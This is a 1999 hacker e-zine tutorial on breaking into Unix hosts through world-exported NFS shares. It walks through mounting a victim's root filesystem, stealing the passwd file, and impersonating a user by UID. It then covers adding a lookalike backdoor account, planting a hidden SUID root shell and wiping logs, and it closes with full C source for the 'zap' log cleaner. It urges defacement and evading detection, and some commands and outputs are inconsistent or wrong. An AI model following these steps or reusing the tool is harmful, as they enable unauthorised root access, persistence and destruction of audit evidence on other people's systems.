@@ -1,0 +1,462 @@
+   _________   SWAT MAGAZINE ISSUE TWENTY: AUGUST 1999   __________
+  /         \___________________________________________/          \
+ /	 Using NFS Mount to get a root shell on a remote host       \
+/                             By Deimos  	                     \
+-----------------------------------------------------------------------
+
+This is a method to obtain a shell account on a server, not 
+neccessarily even on the same network, without a password. "What?", 
+You ask. "Without a password? No Way!" the answer to that, my friend, 
+is yes way. Only a small percentage of systems on the net have 
+intelligent enough admins (usually former hackers, in this case) to 
+actually secure their file system from the rest of the world.
+If you check out various servers, you will begin to understand the way 
+file systems are mountable on the net. Here i will take you through a 
+few steps, leading you up to an actual server...
+
+Okay. First of all, your linux/unix installation will be split into 
+sub-partitions on your hard drive into a file system table something 
+like this:
+
+	/
+	/usr
+	/var
+	/swap
+	/spool
+
+Etc etc.. The actual file system table is always located on a *nix 
+machine in /etc/fstab. Just cat that file, and it will give you the 
+list of partitions. Now, apart from VAX/VMS machines, all *nix machines
+take the above partitioning form.
+	There is a file in /etc called exports - this controls (as the
+name implies) which parts of the file system on that machine is 
+exported to the world. This will only work if the remote host is 
+configured as an NFS server - whatever the weather, you will need to 
+have your machine configured as an NFS client to pull out this stunt. 
+This is default, however, and you should have been given an option 
+wether you would like to be a client when you ran the 
+setup/installation program  for your version. Im not too sure about 
+Redhat, and linux, but i know BSD system's setup file is in 
+/stand/sysinstall , and you can choose wether to be a client/server 
+(or both) within that. Consult your manuals if you are not too sure 
+where abouts your setup file is. By the way, if you're wondering what
+the hell NFS is - it stands for Network File System - basically telling
+you wether your file system is networkable. Your machine will already 
+be configured correctly as an NFS client if it is running on a *nix 
+LAN, as otherwise the machines would not be able to communicate with 
+each other.
+
+	Now, lets get onto the actual stuff. Lets say we are checking
+out a machine called banana on the fruits domain, fruits.com . To find 
+out what parts of its file system is open to the world, type the 
+showmount command:
+
+	$ showmount -e banana.fruits.com
+
+	     /nfs/			(root)
+	     /usr/home/		(root)
+
+	$
+
+as you can see, it ran the command, showed which
+sub-partitions/directories were mountable,  and then returned to the 
+command prompt. As it shows in brackets, these directories are only 
+mountable by root@banana.com . Bummer. Move on to the next machine in 
+that network. You would move on to another machine in the network 
+because normally they are all trusted by one another - hide behind one 
+and your in another, basically. so, lets check out it's networked 
+friend, grapefruit.fruits.com -
+
+	$ showmount -e grapefruit.fruits.com
+
+	     /			(everyone)
+	     /usr			(everyone)
+	     /var			(everyone)
+	     /spool		(everyone)
+	     /adm		(everyone)
+
+	$
+
+Okay. We have stumbled across a machine on the network with a lazy 
+administrator. Lets just hope he stays lazy. These directories, as you
+can see, are world readable/writable. Cool.
+So now, before you actually mount them, check the most important 
+thing: there's no one or not many people on that machine. No-one is 
+the preferable option. If it is really busy, and has hundreds of users
+online, dont go on it. Its not worth it - the connection will be slow, 
+and someone might notice that something smells fishy. Not to worry - 
+check again tonight, at midnight, or some such time when no one will 
+be on. But anyway, to check, just type:
+
+	$ finger @grapefruit.fruits.com
+
+	     WHO	TTY	NAME		FROM		SINCE
+	     -		  -	   -		    -		    -
+	      -		  -  	   -		    -		    -
+
+	$
+
+Hmm, looks good to me - no one on. Okay. So we go for it and mount it.
+Here is the command:
+
+	$ mount -nt nfs grapefruit.fruits.com:/	/mnt/grapefruit
+	$
+
+Basically, breaking down the above, we have 
+	mount -nt nfs = The mount command, specifying that we are doing
+        an NFS mount.
+	grapefruit.fruits.com:/ = We are mounting the machine
+        grapefruit.fruits.com, into /.
+	/mnt/grapefruit = A directory on localhost called grapefruit 
+        that we are going to copy grapefruit.fruits.com's file system 
+        into.
+
+And then it returns you back to the command prompt. So, now, cd to the
+directory you just mounted it into, in this case /mnt/grapefruit/ :
+
+	$ cd /mnt/grapefruit
+	$
+
+Because we've mounted grapefruit's root directory, we have access to 
+his whole system. This is because, when you mount a directory, all 
+subdirectories under that directory (called a 'parent') are 
+readable/writeable as well. We are functioning only as a user account, 
+by the looks of it, as we have a dollar sign as our shell greeting. So 
+the first thing we need to do is get the password file. *IMPORTANT: 
+The passwd file, NOT the shadow file! the shadow is unnessecary, and 
+unimportant. We ONLY need the password file. So, cd to etc, and get 
+the passwd file, copying it to your own system, under a different
+name.
+
+	$ pwd
+	 /mnt/grapefruit/
+	$ cd etc
+	$ ls pass*
+	 passwd
+	$ cp passwd /etc/passwd.grapefruit
+	$ cd /etc
+
+Above, we got the passwd file from grapefruit' /etc directory, (on our
+machine /mnt/grapefruit/etc/) and copied it into our own etc dir, under
+a name of passwd.grapefruit .
+Now, logout of your own system.
+
+Next, login as root, (you have to be running as root in order to do 
+this.) Now, cd to the grapefruit's mounted file system in 
+/mnt/grapefruit/. Do an ls. Among the results, we find:
+
+	# ls
+	 home
+	#
+
+This is the user's directory. This is what we need. Cd into it -
+
+	# cd home
+	# pwd
+	# /mnt/grapefruit/home/
+	#
+
+And do another ls:
+
+	# ls
+	  tom 302
+	  dick 17
+	  harry 908
+	#
+
+The number alongside the user name is the UID - the number that the 
+server identifies this user by. the user 'tom' looks good, so add this
+line to YOUR OWN passwd file:
+
+	tom:x:302:302:/home/tom:/usr/bin/sh
+
+Presuming that line is the same line for tom in grapefruit's passwd 
+file. Just check it:
+
+	# cat /mnt/grapefruit/etc/passwd
+	(and amongst other users:)
+	  tom:x:302:302:/home/tom:/usr/bin/sh
+	#
+
+So we got the line right. Now as root, even on your own system, try 
+and cd to tom's account. (On grapefruit's account, not your own) and 
+you will get a permission denied error, as we, even though running as
+root on our own system, only have user priviliges to grapefruit's file
+system. We want to get into tom's directory, so lets pretend to be him.
+We can do this, because you added tom to your OWN password file. so, 
+su to his account:
+
+	# su tom
+	$ whoami
+	  tom
+	$
+
+so now we are acting as tom. get back into grapefruit's file system:
+
+	$ cd /mnt/grapefruit/home
+	$ whoami
+	  tom
+	$
+
+well, that worked. now, we try and get into tom's directory....
+
+	$ cd tom
+	$ pwd
+	  /mnt/grapefruit/home/tom
+	$
+
+And we're in! Oh yes! Right, now, go about your usual methods, follow
+your own style, etc., of getting root - and once youve got it, (on 
+grapefruit, this is,) before you do anything, you wanna make a backdoor
+so you can get root in the future by typing one command. First of all,
+you need to add yourself to the database: so you can get in and out as
+a normal user in the future. A Lot of hackers do this on exploited
+systems, they add themselves to the passwd/shadow file - but the
+sysadmin might update that passwd file for just that reason - in
+case someone has added an account for themselves. They simply get an
+old backup and overwrite the current one. But, in our case, if we get
+a sysadmin lazy enough not to protect his own file system, I doubt
+very much that he updates his passwd d/b much. So, add yourself to it,
+once working as root on the grapefruit system:
+
+	# whoami
+	  root
+	#
+
+Good. So, now actually adding yourself. Lets say their is an account 
+called tom, as we found out earlier. if we add another account, but 
+with the user name Tom, the sys admin may not notice. So, do this:
+
+	# adduser Tom /home/Tom /bin/sh
+	  Please take note, the password field is empty at the minute.
+          please do not forget to change it at a ater date.
+	# passwd Tom
+	 New passwd for Tom: xxxxxx
+	 Verify passwd: xxxxxx
+	 Updating databases... Done.
+	#
+
+So now you have a Tom account, using an sh shell, in the directory 
+/home/Tom. Lets just hope no-one notices it. Now, get into your 
+directory:
+
+	# cd /mnt/grapefruit/home/Tom
+	#
+
+check there aren't many people on still:
+
+	# who
+
+	     WHO	TTY	NAME		FROM		SINCE
+	      -		  -	   -		    -		    -
+	      -		  -  	   -		    -		    -
+	#
+
+Okay. No-one on. So, now you're in the directory of the user Tom  you 
+just created, make another directory, a hidden one. .temp is a good 
+one to use - hidden, and unsuspicious. So make it, and cd to it:
+
+	# pwd
+	  /mnt/grapefruit/home/Tom/
+	# mkdir .temp
+	# cd .temp
+	# pwd
+	  /mnt/grapefruit/home/Tom/.temp/
+	#
+
+Okay. This is good so far. Now, make a SUID root file (Super User ID) -
+(when you execute a SUID file, you become the owner of the file, or
+you get the priviliges of that owner, anyway. If you get priviliges as
+root, you have success!)
+
+	# cp /mnt/grapefruit/bin/sh .
+	# ls -al
+	  -r-x-r-x-r-x   sh   root   root    00:05, August 1st, 1999
+	#
+
+Okay. The file is already owned by root - all you need to do now is 
+chmod it so it can be run by anyone, giving them root! Firstly, change
+it to a hidden file. (prefix it with a period.)
+
+	# mv sh .sh
+	# chmod a+s .sh
+	# ls -al
+	  -r-s-r-s-r-s sh   root   root     00:06, August 1st, 1999
+	#
+
+Woohoo! Job's done! Now, clean the logs using zap, a program which 
+does it automatically for you. The source code is available at the 
+bottom of this article, zap.c .
+
+	# zap tom ; zap root ; zap Tom
+	  Cleaning log files, please wait.....  Done.
+	#
+
+And done! You do it three times, like above, or however many times you
+want, on each different user you have been using grapefruit's system 
+with. So in the case above, as root, as tom, and as Tom.
+So, now you have done that, un mount grapefruit's file system from
+your system:
+
+	# cd /
+	# umount grapefruit.fruits.com
+	#
+
+Done. Now, exit out of your system completely, and relogin.
+
+	# exit
+	$ exit
+	# exit
+
+	Welcome to FreeBSD.
+	Login:
+
+I typed exit three times above, as i had been in three different shells 
+- remote root, local root, and tom. Now login as your usual user 
+again:
+
+	Login: deimos
+	Password: xxxxxx
+
+	Welcome To FreeBSD 3.1-STABLE. please type /stand/sysinstall 
+        to reconfigure the system.
+
+	$
+
+So now we are on our own system, Try telneting into grapefruit's 
+system:
+
+	$ telnet grapefruit.fruits.com
+
+	Welcome to Fruits of the Loom, Inc. Please authorize:
+	Login: Tom
+	Password: xxxxxx
+
+	Please enjoy your stay.
+
+	$
+
+And so now we are working as Tom, (the user we created earlier) in a 
+telnet session, on grapefruit's system. If you want now to go into 
+root, run your SUID root file you created earlier... (a bit of a 
+'Heres one i made earlier' thing there....)
+
+	$ cd .temp
+	$ ls
+
+	$
+
+Oh yeah, we made it a hidden file, remember?:
+
+	$ ls -a
+	 .       ..      .ls
+	$
+
+There it is! Now run it, making sure you use ./ to run it, as it is not
+in your path. (and don't put in in your path, that will just lead the
+admin straight to it...)
+
+	$  whoami
+	  Tom
+	$ ./.sh
+	# whoami
+	  root
+	#
+
+woohoo!
+
+And there you have it, a pretty simple method to getting root on a 
+system. But whatever you do, DON'T FORGET TO CLEAN THE LOG FILES!!! 
+WIPE YOUR PRESENCE! And if you are going to make changes, like kill 
+the web pages, and upload your own, do your dirty work, and then 
+delete any files that got you there. Delete the user Tom, delete his 
+directory, profile, the SUID root file, absolutely everything. Just 
+DELETE IT ALL!!!!
+
+Have a good time, and don't get caught! That is my one piece of advice-
+DON'T GET CAUGHT!!!!
+
+--Deimos
+
+Here is Zap.c:
+
+
+~~~~~~~~~~~~~~~~cute here~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+/*
+      Title:  Zap.c (c) rokK Industries
+   Sequence:  911204.B
+
+    Syztems:  Kompiles on SunOS 4.+
+       Note:  To mask yourself from lastlog and wtmp you need to be root,
+              utmp is go+w on default SunOS, but is sometimes removed.
+    Kompile:  cc -O Zap.c -o Zap
+        Run:  Zap <Username>
+
+       Desc:  Will Fill the Wtmp and Utmp Entries corresponding to the
+              entered Username. It also Zeros out the last login data for
+              the specific user, fingering that user will show 'Never Logged
+              In'
+
+      Usage:  If you cant find a usage for this, get a brain.
+*/
+
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <lastlog.h>
+#include <pwd.h>
+
+int f;
+
+void kill_tmp(name,who)
+char *name,
+     *who;
+{
+    struct utmp utmp_ent;
+
+  if ((f=open(name,O_RDWR))>=0) {
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                 write (f, &utmp_ent, sizeof (utmp_ent));
+            }
+     close(f);
+  }
+}
+
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+
+     if ((pwd=getpwnam(who))!=NULL) {
+
+        if ((f=open("/usr/adm/lastlog", O_RDWR)) >= 0) {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        }
+
+    } else printf("%s: ?\n",who);
+}
+
+main(argc,argv)
+int  argc;
+char *argv[];
+{
+    if (argc==2) {
+        kill_tmp("/etc/utmp",argv[1]);
+        kill_tmp("/usr/adm/wtmp",argv[1]);
+        kill_lastlog(argv[1]);
+        printf("Zap!\n");
+    } else
+    printf("Error.\n");
+}
+
+~~~~~~~~~~~cut here~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
